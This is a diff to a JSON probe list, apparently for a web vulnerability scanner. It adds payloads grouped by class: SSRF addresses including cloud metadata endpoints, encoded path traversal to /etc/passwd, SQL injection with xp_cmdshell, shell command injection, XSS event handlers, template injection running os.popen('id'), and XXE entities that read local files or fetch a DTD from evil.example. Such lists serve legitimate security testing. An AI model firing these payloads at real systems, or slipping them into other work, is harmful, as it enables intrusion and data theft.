@@ -72,7 +72,11 @@
         "https:/\\evil.example",
         "https://evil.example%2f%2e%2e",
         "http://169.254.169.254/latest/user-data/",
-        "http://metadata.google.internal/computeMetadata/v1/"
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://0/",
+        "http://[::]:80/",
+        "http://127。0。0。1/",
+        "http://①②⑦.⓪.⓪.①/"
       ]
     },
     {
@@ -106,7 +110,11 @@
         "\\\\127.0.0.1\\c$\\windows\\win.ini",
         "c:/windows/win.ini",
         "CON",
-        "NUL"
+        "NUL",
+        "/etc/passwd/.",
+        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
+        "%SystemRoot%\\win.ini",
+        "....//....\\/....//etc/passwd"
       ]
     },
     {
@@ -142,7 +150,12 @@
         "' SLEEP(5)#",
         "';WAITFOR DELAY '0:0:5'--",
         "1' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--",
-        "{\"$ne\": null}"
+        "{\"$ne\": null}",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+        "' AND (SELECT * FROM(SELECT SLEEP(5))a)-- -",
+        "'+(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)+'",
+        "SLEEP(1)/*'or SLEEP(1)or'\"or SLEEP(1)or\"*/",
+        "';EXEC xp_cmdshell('whoami')-- -"
       ]
     },
     {
@@ -176,7 +189,12 @@
         ";`which$IFS'id'`",
         "a;id",
         "a'|id'",
-        "a\"|id\""
+        "a\"|id\"",
+        ";$(printf '\\x69\\x64')",
+        ";perl -e 'select(undef,undef,undef,5);'",
+        ";python3 -c 'import time;time.sleep(5)'",
+        "|awk 'BEGIN{system(\"id\")}'",
+        "cat${PATH:0:1}etc${PATH:0:1}passwd"
       ]
     },
     {
@@ -211,7 +229,9 @@
         "{{constructor.constructor('alert(1)')()}}",
         "${alert(1)}",
         "java%0ascript:alert(1)",
-        "<math><x/xlink:href=javascript:alert(1)>click"
+        "<math><x/xlink:href=javascript:alert(1)>click",
+        "style=\"content-visibility:auto\"+oncontentvisibilityautostatechange=confirm(\"xsstest\")+x=\"",
+        "style=\"content-visibility:auto\"+oncontentvisibilityautostatechange=top['con'+'firm']('xsstest')+x=\""
       ]
     },
     {
@@ -259,13 +279,16 @@
         "#{T(java.lang.Math).abs(-7)}",
         "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
         "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
-        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }"
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
+        "${{<%[%'\"}}%\\",
+        "#set($x=7*7)$x",
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}"
       ]
     },
     {
       "class": "XXE",
       "contentTypeContains": ["xml", "soap"],
-      "note": "XML External Entity injection probes for local file disclosure or SSRF. Surfaced on endpoints whose Content-Type carries XML/SOAP -- inject inside the body's DOCTYPE.",
+      "note": "XML External Entity injection probes for local file disclosure or SSRF. Surfaced on endpoints whose Content-Type carries XML/SOAP -- inject inside the body's DOCTYPE. Also worth trying on SVG file uploads (parsed as XML by many image libraries) and XML-RPC endpoints (e.g. xmlrpc.php).",
       "basic": [
         "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><a >&test;</a>",
         "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY test SYSTEM \"http://evil.example/\">]><a >&test;</a>"
@@ -273,7 +296,10 @@
       "bypass": [
         "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>",
         "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-+ACE-DOCTYPE foo+ADw-+ACE-ENTITY xxe SYSTEM +ACI-http://evil.example+ACI-+AD4-+AD4-",
-        "<!DOCTYPE a SYSTEM \"http://evil.example/evil.dtd\">"
+        "<!DOCTYPE a SYSTEM \"http://evil.example/evil.dtd\">",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.example/evil.dtd\">%xxe;]>",
+        "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"1\" height=\"1\" xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>",
+        "<?xml version=\"1.0\"?><!DOCTYPE methodCall [<!ELEMENT methodName ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><methodCall><methodName>&xxe;</methodName></methodCall>"
       ]
     },
     {
